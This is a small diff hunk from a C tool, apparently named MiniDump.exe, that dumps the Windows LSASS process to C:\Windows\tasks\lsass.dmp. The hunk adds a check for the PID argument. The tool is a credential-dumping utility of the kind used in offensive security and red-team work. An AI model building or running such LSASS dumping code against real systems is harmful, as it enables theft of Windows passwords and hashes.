@@ -8,6 +8,11 @@
 
 int main(int argc, char* argv[]) {
 
+	if (argc < 2) {
+		printf("Usage: MiniDump.exe <PID>\n");
+		return EXIT_FAILURE;
+	}
+
 	LPCWSTR filePath = L"C:\\Windows\\tasks\\lsass.dmp";
 	HANDLE hProcess, hFile;
 	DWORD LsassProcessID = atoi(argv[1]);
